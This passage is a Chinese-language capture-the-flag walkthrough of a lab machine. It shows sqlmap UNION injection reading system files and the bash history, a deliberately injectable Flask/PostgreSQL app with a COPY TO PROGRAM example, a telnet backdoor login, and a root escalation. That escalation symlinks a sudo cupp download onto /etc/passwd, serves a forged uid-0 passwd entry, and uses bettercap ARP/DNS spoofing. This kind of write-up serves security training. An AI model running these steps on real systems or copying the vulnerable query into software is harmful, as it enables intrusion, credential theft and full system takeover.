&gt; write_enable=YES        # 允许写入！这是另一个关键
&gt; ...
&gt; chroot_local_user=YES   # 将用户限制在自己的家目录中
&gt; allow_writeable_chroot=YES # 允许家目录可写（这是一个不安全的配置，通常需要避免）
&gt; ...
&gt; pam_service_name=vsftpd
&gt; ...
&gt; userlist_enable=YES      # &lt;-- ！！！ 开启了用户列表功能
&gt; userlist_file=/etc/vsftpd.userlist # &lt;-- ！！！ 指定了用户列表文件
&gt; userlist_deny=NO         # &lt;-- ！！！ 这是决定性的一击！

扒拉他用户列表文件

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/etc/vsftpd.userlist', 0, 1000000)'
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:51:25 /2025-07-21/

[23:51:25] [INFO] parsing HTTP request from 'tmp/1'
[23:51:25] [INFO] resuming back-end DBMS 'postgresql' 
[23:51:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[23:51:25] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[23:51:25] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/etc/vsftpd.userlist', 0, 1000000)'
[23:51:25] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file('/etc/vsftpd.userlist', 0, 1000000): 'secure_user\n'
[23:51:25] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 23:51:25 /2025-07-21/
```

只有 **secure_user** 这一个用户被授权可以通过 FTP 服务进行登录尝试

我们进行登录

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ftp 192.168.205.205
Connected to 192.168.205.205.
220 (vsFTPd 3.0.3)
Name (192.168.205.205:kali): secure_user
530 Non-anonymous sessions must use encryption.
ftp: Login failed
ftp&gt; exit
```

叫我们加密会话，所以换lftp

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ lftp -u secure_user 192.168.205.205
密码: secure_user
lftp secure_user@192.168.205.205:~&gt; ls                
ls: 严重错误: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (71:24:67:D0:3C:52:A2:8F:AF:8F:11:F9:D1:D7:19:08:A1:20:35:49)
```

禁用证书

```bash
lftp secure_user@192.168.205.205:~&gt; set ssl:verify-certificate no
lftp secure_user@192.168.205.205:~&gt; ls
ls: 登录失败: 530 Login incorrect.       
```

密码是错的，后面尝试了爆破，没有收获，就回去看sql了

查看SQL权限

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT current_user'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:11:48 /2025-07-22/

[00:11:48] [INFO] parsing HTTP request from 'tmp/1'
[00:11:48] [INFO] resuming back-end DBMS 'postgresql' 
[00:11:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[00:11:48] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[00:11:48] [INFO] fetching SQL SELECT statement query output: 'SELECT current_user'
[00:11:48] [WARNING] reflective value(s) found and filtering out
SELECT current_user: 'dvuser'
[00:11:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 00:11:48 /2025-07-22/
```

读取一下他的命令历史记录

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000)'
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:13:37 /2025-07-22/

[00:13:37] [INFO] parsing HTTP request from 'tmp/1'
[00:13:37] [INFO] resuming back-end DBMS 'postgresql' 
[00:13:37] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[00:13:37] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[00:13:37] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000)'
[00:13:37] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000): 'geAbgWpouT=xBcZHwGxAX KOxuJqpGxZ=KEqNdLkFrf;printf $geAbgWpouT$KOxuJqpGxZ;echo $$;printf $KOxuJqpGxZ$geAbgWpouT\n hSAkQvpQLQ=lTHFyQbFqh nSpdwixuov=CqlpNdGWDg;printf $hSAkQvpQLQ$nSpdwixuov;echo '$(id -un)($(id -u))';printf $nSpdwixuov$hSAkQvpQLQ\n SNBrffgiiZ=ELTGdWlbkd ranIeerCgZ=dhqaYbOtwr;printf $SNBrffgiiZ$ranIeerCgZ;tty;printf $ranIeerCgZ$SNBrffgiiZ\ncd /home\nfind \ncd /usr/local/bin\nls -la\ncat custom_login \ncat /etc/default/telnet\necho 'ENABLE_BACKDOOR' &gt; /etc/default/telnet\ncd /var/www/html/\nls -la\ncd pub/\nls -la\ntouch a\ncd /home\ncd /opt\nls\ncat app.py \ncd /srv\nls -la\nfind\nls -la\ncd secure_share/\n'
[00:13:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 00:13:37 /2025-07-22/
```

&gt;... (一些混淆视听的命令) ...
&gt;
&gt;cd /opt          # &lt;-- 他进入了 /opt 目录
&gt;ls
&gt;cat app.py       # &lt;-- ！！！他查看了一个叫做 app.py 的文件！
&gt;cd /srv
&gt;ls -la
&gt;find
&gt;ls -la
&gt;cd secure_share/ # &lt;-- 这个共享目录我们之前见过

去看看app.py的源码

```bash
──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/opt/app.py', 0, 1000000)'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:14:51 /2025-07-22/

[00:14:51] [INFO] parsing HTTP request from 'tmp/1'
[00:14:51] [INFO] resuming back-end DBMS 'postgresql' 
[00:14:51] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[00:14:51] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[00:14:51] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/opt/app.py', 0, 1000000)'
[00:14:51] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file('/opt/app.py', 0, 1000000): 'from flask import Flask, request, render_template_string, redirect, session\nimport psycopg2\n\napp = Flask(__name__)\napp.secret_key = 's3cret_key'\n\n# Database connection\nconn = psycopg2.connect(\n    dbname='dvtest',\n    user='dvuser',\n    password='dvpass',\n    host='localhost',\n    port='5432'\n)\n\n# HTML template with search form\nTEMPLATE = '''\n&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Admin Panel&lt;/title&gt;\n    &lt;style&gt;\n        body { font-family: Arial, sans-serif; margin: 20px; }\n        table { border-collapse: collapse; width: 100%; }\n        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }\n        th { background-color: #f2f2f2; }\n        .error { color: red; }\n    &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h2&gt;Welcome{% if user %}, {{ user }}{% endif %}&lt;/h2&gt;\n    {% if not user %}\n        &lt;form method='POST' action='/'&gt;\n            Username: &lt;input name='username' required&gt;\n            &lt;input type='submit' value='Login'&gt;\n        &lt;/form&gt;\n    {% else %}\n        &lt;p&gt;&lt;a href='/search'&gt;User Search&lt;/a&gt; | &lt;a href='/logout'&gt;Logout&lt;/a&gt;&lt;/p&gt;\n        &lt;form method='POST' action='/search'&gt;\n            Search User: &lt;input name='keyword' placeholder='Enter username' value='{{ keyword|default('') }}'&gt;\n            &lt;input type='submit' value='Search'&gt;\n        &lt;/form&gt;\n    {% endif %}\n    {% if results %}\n        &lt;h3&gt;Search Results&lt;/h3&gt;\n        &lt;table&gt;\n            &lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Username&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;\n            {% for row in results %}\n                &lt;tr&gt;&lt;td&gt;{{ row[0] }}&lt;/td&gt;&lt;td&gt;{{ row[1] }}&lt;/td&gt;&lt;td&gt;{{ row[2] }}&lt;/td&gt;&lt;/tr&gt;\n            {% endfor %}\n        &lt;/table&gt;\n    {% endif %}\n    {% if message %}\n        &lt;p class='error'&gt;{{ message }}&lt;/p&gt;\n    {% endif %}\n&lt;/body&gt;\n&lt;/html&gt;\n'''\n\n@app.route('/', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        if username:\n            session['user'] = username\n            return redirect('/search')\n        return render_template_string(TEMPLATE, user=None, message='Username cannot be empty')\n    return render_template_string(TEMPLATE, user=None)\n\n@app.route('/logout')\ndef logout():\n    session.pop('user', None)\n    return redirect('/')\n\n@app.route('/search', methods=['GET', 'POST'])\ndef search():\n    if 'user' not in session:\n        return redirect('/')\n    \n    results = []\n    message = None\n    keyword = ''\n    \n    if request.method == 'POST':\n        keyword = request.form.get('keyword', '')\n        try:\n            cur = conn.cursor()\n            # Vulnerable SQL query: allows injection of commands like COPY TO PROGRAM\n            # Example exploit: ' OR 1=1; COPY users TO PROGRAM 'whoami'; --\n            sql = f'SELECT id, username, email FROM users WHERE username LIKE '%{keyword}%''\n            cur.execute(sql)\n            results = cur.fetchall()\n            conn.commit()\n        except Exception as e:\n            conn.rollback()\n            message = f'Query failed: {str(e)}'\n    \n    return render_template_string(TEMPLATE, user=session['user'], results=results, message=message, keyword=keyword)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=28080)\n'
[00:14:51] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 00:14:51 /2025-07-22/
```

后面扒拉了一会，惊奇的发现前面白干了，telnet是个后门

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ telnet 192.168.205.205
Trying 192.168.205.205...
Connected to 192.168.205.205.
Escape character is '^]'.
Username: 
xiao  
Password: 
login successful
Linux Multi 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
Your session is being monitored per security policy
xiao@Multi:~$ id
uid=1001(xiao) gid=1001(xiao) groups=1001(xiao)
```

# 三、权限提升

## to todd

```bash
xiao@Multi:~$ sudo -l
Sudo access restricted by policy (CODE:0x7E3) -l
xiao@Multi:~$ ls -al
total 24
drwx------ 2 xiao xiao 4096 Jul 18 22:46 .
drwxr-xr-x 5 root root 4096 Jul 17 09:04 ..
lrwxrwxrwx 1 root root    9 Jul 18 11:13 .bash_history -&gt; /dev/null
-rw-r--r-- 1 xiao xiao  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 xiao xiao 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 xiao xiao  807 Apr 18  2019 .profile
-rw------- 1 xiao xiao   44 Jul 17 07:31 user.txt
xiao@Multi:~$ cat user.txt 
flag{user-33b02bc15ce9557d2dd8484d58f95ac4}
xiao@Multi:~$ which sudo
/usr/bin/sudo
xiao@Multi:~$ /usr/bin/sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

[sudo] password for xiao: 
sudo: a password is required
```

sudo被限制了，看看其他的
```bash
xiao@Multi:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/sbin/mount.nfs
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/telnetlogin
/usr/libexec/polkit-agent-helper-1
xiao@Multi:~$ getcap -r / 2&gt;/dev/null
xiao@Multi:~$ ls -al /opt/
total 12
drwxr-xr-x  2 root root 4096 Jul 18 11:21 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
-rw-r--r--  1 root root 3136 Jul 18 11:21 app.py
xiao@Multi:~$ find / -user xiao ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2&gt;/dev/null
/dev/pts/0
/home/xiao
/home/xiao/.bash_logout
/home/xiao/.bashrc
/home/xiao/user.txt
/home/xiao/.profile
/var/www/html/pub
```

`/var/www/html/pub`这个目录之前爆破到了，但是什么东西都没有，我们去看看

```bash
xiao@Multi:~$ cd /var/www/html/pub
xiao@Multi:/var/www/html/pub$ ls -al
total 16
drwxr-xr-x 2 xiao     www-data 4096 Jul 18 22:43 .
drwxr-xr-x 3 root     root     4096 Jul 17 09:05 ..
-rw-r--r-- 1 root     root      230 Jul 18 11:38 index.html
-rw------- 1 www-data www-data   19 Jul 17 09:06 xiao@Multi:~$ cd /var/www/html/pub
xiao@Multi:/var/www/html/pub$ ls -al
total 16
drwxr-xr-x 2 xiao     www-data 4096 Jul 18 22:43 .
drwxr-xr-x 3 root     root     4096 Jul 17 09:05 ..
-rw-r--r-- 1 root     root      230 Jul 18 11:38 index.html
-rw------- 1 www-data www-data   19 Jul 17 09:06 .passowrd_creds
```

有一个`.passowrd_creds`，去web读一下

拿到了一个密码`koUF5q)*RN&amp;m0PTB&amp;D`，经过测试是todd的密码

```bash
xiao@Multi:/var/www/html/pub$ su todd
Use of su is prohibited (CODE:0x9F2) todd
xiao@Multi:/var/www/html/pub$ which su
/usr/bin/su
xiao@Multi:/var/www/html/pub$ /usr/bin/su todd
Password: 
todd@Multi:/var/www/html/pub$ id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

## to root

```bash
todd@Multi:/var/www/html/pub$ sudo -l
Matching Defaults entries for todd on Multi:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+='LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET', env_keep+='XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH', mail_badpass

Runas and Command-specific defaults for todd:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User todd may run the following commands on Multi:
    (ALL : ALL) NOPASSWD: /usr/bin/cupp
```

这里应该就是这个靶机有意思的点了，cupp是一个字典生成器

```bash
todd@Multi:/var/www/html/pub$ sudo /usr/bin/cupp -h
usage: cupp [-h] [-i | -w FILENAME | -l | -a | -v] [-q]

Common User Passwords Profiler

optional arguments:
  -h, --help         show this help message and exit
  -i, --interactive  Interactive questions for user password profiling
  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
  -l                 Download huge wordlists from repository
  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which were merged and enhanced
  -v, --version      Show the version of this program.
  -q, --quiet        Quiet mode (don't print banner)
```

经过测试，你应该会发现`-i` ,`-w` 生成的字典会固定`.txt`的后缀，所以我们很难利用

比较可能性的是`-l`

具体操作

```bash
todd@Multi:/var/www/html/pub$ cd 
todd@Multi:~$ sudo /usr/bin/cupp -l
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian       


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

&gt; Enter number: 1
[+] Downloading dictionaries/Moby/mhyph.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz ... 
^CTraceback (most recent call last):
  File '/usr/bin/cupp', line 1078, in &lt;module&gt;
    main()
  File '/usr/bin/cupp', line 1024, in main
    download_wordlist()
  File '/usr/bin/cupp', line 782, in download_wordlist
    download_wordlist_http(filedown)
  File '/usr/bin/cupp', line 993, in download_wordlist_http
    download_http(url, tgt)
  File '/usr/bin/cupp', line 698, in download_http
    localFile.write(webFile.read())
  File '/usr/lib/python3.9/http/client.py', line 471, in read
    s = self._safe_read(self.length)
  File '/usr/lib/python3.9/http/client.py', line 612, in _safe_read
    data = self.fp.read(amt)
  File '/usr/lib/python3.9/socket.py', line 704, in readinto
    return self._sock.recv_into(b)
KeyboardInterrupt
```

可以看到执行 sudo /usr/bin/cupp -l 后，脚本会从一个固定的 URL (http://ftp.funet.fi/...) 下载文件。下载的文件会保存在**当前工作目录**下，并创建一个 `dictionaries/` 子目录结构。例如，选择 1 Moby，它会尝试创建并写入文件到 `./dictionaries/Moby/mhyph.tar.gz`。因为命令是以 sudo 执行的，所以文件写入操作拥有 root 权限。

这里就有一个问题，他没有检查目标路径是否为一个符号链接，所以我们想覆盖什么就覆盖什么

```bash
todd@Multi:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
xiao:x:1001:1001::/home/xiao:/bin/bash
telnetd:x:106:113::/nonexistent:/usr/sbin/nologin
redis:x:107:114::/var/lib/redis:/usr/sbin/nologin
ftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
secure_user:x:1002:1002::/home/secure_user:/bin/bash
mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
samba_user:x:1003:1003::/home/samba_user:/bin/false
_rpc:x:110:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin
postgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
todd:x:1000:1000:,,,:/home/todd:/bin/bash

todd@Multi:~$ find dictionaries/
dictionaries/
dictionaries/Moby
dictionaries/Moby/mhyph.tar.gz
```

先将现在的dictionaries重命名为1（在我们的家目录下，我们有绝对的权限），并伪造一个恶意的dictionaries

```bash
todd@Multi:~$ mv dictionaries/ 1
todd@Multi:~$ mkdir -p dictionaries/Moby
todd@Multi:~$ cd dictionaries/Moby/
todd@Multi:~/dictionaries/Moby$ ln -s /etc/passwd mhyph.tar.gz
```

切换到kail，按照他的passwd在最后一行给自己加一个特权用户，然后重命名，开一个web服务

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd tmp 
                          
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mkdir -p ./pub/unix/security/passwd/crack/dictionaries/Moby/
                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mkdir -p ./pub/unix/security/passwd/crack/dictionaries/Moby/
                               
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ vim ./pub/unix/security/passwd/crack/dictionaries/Moby/pass        
                       
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ tail -n 1 ./pub/unix/security/passwd/crack/dictionaries/Moby/pass
b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mv ./pub/unix/security/passwd/crack/dictionaries/Moby/pass ./pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

启动 DNS 欺骗

```bash
sudo bettercap
&gt;&gt; set arp.spoof.targets 192.168.205.205
&gt;&gt; set dns.spoof.domains ftp.funet.fi
&gt;&gt; set dns.spoof.address 192.168.205.128
&gt;&gt; arp.spoof on
&gt;&gt; dns.spoof on
```

触发漏洞

```bash
todd@Multi:~/dictionaries/Moby$ cd 
todd@Multi:~$ sudo /usr/bin/cupp -l
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian       


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

&gt; Enter number: 1
[+] Downloading dictionaries/Moby/mhyph.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz ... 
[+] Downloading dictionaries/Moby/mlang.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mlang.tar.gz ... 
Traceback (most recent call last):
  File '/usr/bin/cupp', line 1078, in &lt;module&gt;
    main()
  File '/usr/bin/cupp', line 1024, in main
    download_wordlist()
  File '/usr/bin/cupp', line 782, in download_wordlist
    download_wordlist_http(filedown)
  File '/usr/bin/cupp', line 993, in download_wordlist_http
    download_http(url, tgt)
  File '/usr/bin/cupp', line 696, in download_http
    webFile = urllib.request.urlopen(url)
  File '/usr/lib/python3.9/urllib/request.py', line 214, in urlopen
    return opener.open(url, data, timeout)
  File '/usr/lib/python3.9/urllib/request.py', line 523, in open
    response = meth(req, response)
  File '/usr/lib/python3.9/urllib/request.py', line 632, in http_response
    response = self.parent.error(
  File '/usr/lib/python3.9/urllib/request.py', line 561, in error
    return self._call_chain(*args)
  File '/usr/lib/python3.9/urllib/request.py', line 494, in _call_chain
    result = func(*args)
  File '/usr/lib/python3.9/urllib/request.py', line 641, in http_error_default
    raise HTTPError(req.full_url, code, msg, hdrs, fp)
urllib.error.HTTPError: HTTP Error 404: File not found
```

报错了，并且bettercap和pyton web都有提示就是成功了

```bash
todd@Multi:~$ su b
Password: 
root@Multi:/home/todd# id
uid=0(root) gid=0(root) groups=0(root)
root@Multi:/home/todd# cat /root/root.txt /home/xiao/user.txt 
flag{root-922c8837565de5bd2e342c65a2e67ef9}
flag{user-33b02bc15ce9557d2dd8484d58f95ac4}
```

